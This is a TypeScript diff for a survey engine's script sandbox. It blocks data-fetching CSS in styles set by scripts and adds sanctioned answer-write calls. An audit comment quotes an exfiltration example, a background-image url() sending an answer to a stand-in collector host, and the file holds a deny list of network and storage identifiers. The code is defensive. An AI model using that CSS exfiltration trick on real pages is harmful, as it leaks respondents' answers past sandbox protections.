@@ -328,7 +328,20 @@ export interface DeclCheck { ok: Record<string, string>; errors: string[]; warni
  * declaration ({ } ; <), run code (expression(), javascript:, bindings), or
  * load from anywhere but https / an inline image passes.
  */
-export function checkDeclarations(decls: Record<string, unknown>, ctx: { target?: UxTarget; where?: string } = {}): DeclCheck {
+/**
+ * SCRIPT-ORIGINATED STYLES LOAD NOTHING (audit 2026-10-30 D4). A style an author writes in the Style panel is
+ * compiled once, reviewed, and may load an https image. A style a SCRIPT sets is computed at run time — from
+ * answers — and `background-image: url(https://collector/?d=<answer>)` sent the answer off the page through the
+ * real document, past the sandbox. So with `origin: "script"` any value that can make the browser fetch is
+ * refused: url(…), image-set(…) (also -webkit-), @import, expression(…). The refusal names the reason; the caller
+ * logs it to the script console.
+ */
+export const SCRIPT_STYLE_FETCH = /\burl\s*\(|image-set\s*\(|@import|expression\s*\(|\bimage\s*\(|cross-fade\s*\(|\bsrc\s*\(/i;
+export function scriptStyleRefusal(value: string): string | null {
+  return SCRIPT_STYLE_FETCH.test(value) ? "a script cannot load anything through a style — url(), image-set(), @import and expression() are refused in values set from code (an image belongs in the Style panel or the question's media)" : null;
+}
+
+export function checkDeclarations(decls: Record<string, unknown>, ctx: { target?: UxTarget; where?: string; origin?: "author" | "script" } = {}): DeclCheck {
   const ok: Record<string, string> = {}, errors: string[] = [], warnings: string[] = [];
   const at = ctx.where ? `${ctx.where}: ` : "";
   for (const [rawProp, rawVal] of Object.entries(decls ?? {})) {
@@ -336,6 +349,7 @@ export function checkDeclarations(decls: Record<string, unknown>, ctx: { target?
     const value = String(rawVal ?? "").trim();
     if (!PROP_RE.test(prop)) { errors.push(`${at}“${rawProp}” is not a CSS property`); continue; }
     if (BANNED_PROPS.has(prop)) { errors.push(`${at}${prop} is not allowed`); continue; }
+    if (ctx.origin === "script") { const r = scriptStyleRefusal(value); if (r) { errors.push(`${at}${prop}: ${r}`); continue; } }
     const v = checkValue(value);
     if (v) { errors.push(`${at}${prop}: ${v}`); continue; }
     ok[prop] = value;
@@ -667,13 +681,18 @@ export function compileUxCss(def: SurveyDefinition, live?: { state?: ResponseSta
 /* ------------------------------------------------------------ scripts */
 
 /** what a sandboxed script can call — and nothing else */
-export const UX_SCRIPT_API = ["listen", "getAnswer", "getQuestion", "getBlock", "getPage", "addClass", "removeClass", "toggleClass", "animate", "setStyle", "clearStyle", "show", "hide", "showMessage", "hideMessage", "scrollTo", "focus", "after", "log", "popup", "closePopup", "goToPage", "goToSection"] as const;
+export const UX_SCRIPT_API = ["listen", "getAnswer", "getQuestion", "getBlock", "getPage", "addClass", "removeClass", "toggleClass", "animate", "setStyle", "clearStyle", "show", "hide", "showMessage", "hideMessage", "scrollTo", "focus", "after", "log", "popup", "closePopup", "goToPage", "goToSection",
+  /* S1a: the engine-checked write channel (requests the host decides — scriptWrites.ts) and the reads beside it; rs.error inside a "validate" handler */
+  "getEmbedded", "getCalc", "setAnswer", "setEmbedded", "setCalc", "flag", "error"] as const;
+/** S1a: the rs calls that ask the host to write (each returns a promise of { ok, reason }) */
+export const UX_SCRIPT_WRITES = ["setAnswer", "setEmbedded", "setCalc", "flag"] as const;
 const TARGET_FIRST = new Set(["addClass", "removeClass", "toggleClass", "animate", "setStyle", "clearStyle", "show", "hide", "showMessage", "hideMessage", "scrollTo", "focus"]);
 /** names that are refused wherever they appear */
 const FORBIDDEN_IDENTIFIERS = ["eval", "Function", "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "importScripts", "import", "require", "localStorage", "sessionStorage", "indexedDB", "caches", "window", "opener", "globalThis", "navigator", "location", "cookie", "postMessage", "Worker", "SharedWorker", "ServiceWorker", "constructor", "__proto__", "prototype", "Reflect", "Proxy", "setInterval"];
 /** names that are only a problem on their own (`top` is a global; `el.style.top` is a style property) */
 const FORBIDDEN_WHEN_BARE = ["parent", "top", "frames", "self"];
-export const UX_SCRIPT_EVENTS = ["answer", "change", "select", "deselect", "click", "hover", "page", "complete"] as const;
+/** "validate" / "submit" (S1a): run on Next — validate after built-in validation passed (rs.error stops Next), submit before the page is left */
+export const UX_SCRIPT_EVENTS = ["answer", "change", "select", "deselect", "click", "hover", "page", "complete", "validate", "submit"] as const;
 /** the behaviour-event spellings a script may use for the same thing (the effects form says page_enter, select_option…) */
 export const UX_SCRIPT_EVENT_ALIASES: Record<string, (typeof UX_SCRIPT_EVENTS)[number]> = { page_enter: "page", page_load: "page", load: "page", appear: "page", enter: "page", page_complete: "complete", select_option: "select", deselect_option: "deselect" };
 
@@ -721,7 +740,13 @@ export function validateUxScript(code: string, def: SurveyDefinition): ScriptChe
   warnings.push(...selectorGuesses(code));
   const usedApi = [...bare.matchAll(/\brs\s*\.\s*([A-Za-z_$][\w$]*)/g)].map((m) => ({ name: m[1], at: m.index! + m[0].length }));
   // the commonest wrong turn: a script filling in an answer. Scripts change the look; a starting answer is a question setting
-  const FILLS = new Set(["setAnswer", "setValue", "setDefault", "fill", "prefill", "answer"]);
+  /*
+   * S1a: rs.setAnswer is now the SANCTIONED write — a request the host decides with the engine (scope, response
+   * model, size), applied on the respondent's own path. Writing the mirror (`.value =`, `.checked =`, a dispatched
+   * event) stays refused: it would change nothing, and it would look as if it did.
+   */
+  const FILLS = new Set(["setValue", "setDefault", "fill", "prefill", "answer"]);
+  if (usedApi.some((u) => FILLS.has(u.name)) || /\.\s*(value|checked|selectedIndex|selected)\s*=(?!=)|\bdispatchEvent\b/.test(bare)) warnings.push("to write an answer from a script use rs.setAnswer(code, value) — the survey checks it like the respondent's own input; prefer a default value, a punch rule or a calculation when they can say it");
   if (usedApi.some((u) => FILLS.has(u.name)) || /\.\s*(value|checked|selectedIndex|selected)\s*=(?!=)|\bdispatchEvent\b/.test(bare)) errors.unshift("scripts cannot fill in or change answers — to start a question with an answer, set its default value (the set_default_value action, or Properties → Default value)");
   for (const u of usedApi) if (!(UX_SCRIPT_API as readonly string[]).includes(u.name) && !FILLS.has(u.name)) errors.push(`rs.${u.name} is not part of the survey api (${UX_SCRIPT_API.join(", ")})`);
   if (!usedApi.length && !/(^|[^\w$.])document(?![\w$])/.test(bare)) warnings.push("the script uses neither the rs api nor the document, so it cannot change anything");
@@ -743,7 +768,7 @@ export function validateUxScript(code: string, def: SurveyDefinition): ScriptChe
       const t = firstString(u.at);
       if (t != null && t !== "self") { const r = resolveUxTarget(def, t); if (typeof r === "string") errors.push(`rs.${u.name}("${t}"): ${r}`); }
     }
-    if (u.name === "getAnswer" || u.name === "getQuestion") {
+    if (u.name === "getAnswer" || u.name === "getQuestion" || u.name === "setAnswer") {
       const t = firstString(u.at);
       if (t != null && !defaultUxLookups(def).question(t)) errors.push(`rs.${u.name}("${t}"): there is no question “${t}”`);
     }
